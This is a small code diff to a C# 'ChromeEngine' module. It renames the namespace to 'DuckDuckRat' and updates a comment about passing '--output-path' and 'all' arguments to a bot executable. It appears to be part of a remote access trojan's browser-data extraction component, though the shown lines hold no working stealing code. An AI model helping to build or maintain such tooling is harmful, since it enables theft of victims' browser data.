@@ -1,7 +1,7 @@
 using System;
 using System.Runtime.InteropServices;
 
-namespace VanguardCore.Modules
+namespace DuckDuckRat.Modules
 {
     public static partial class ChromeEngine
     {
@@ -14,7 +14,7 @@ namespace VanguardCore.Modules
         {
             try
             {
-                // Prepare arguments: [FinalBot.exe, --output-path, {path}, all]
+                // Prepare arguments: [DuckDuckRat.exe, --output-path, {path}, all]
                 // Note: argv[0] is usually the program name.
                 string[] args = new string[] { 
                     "--output-path", 
@@ -33,3 +33,5 @@ namespace VanguardCore.Modules
         }
     }
 }
+
+
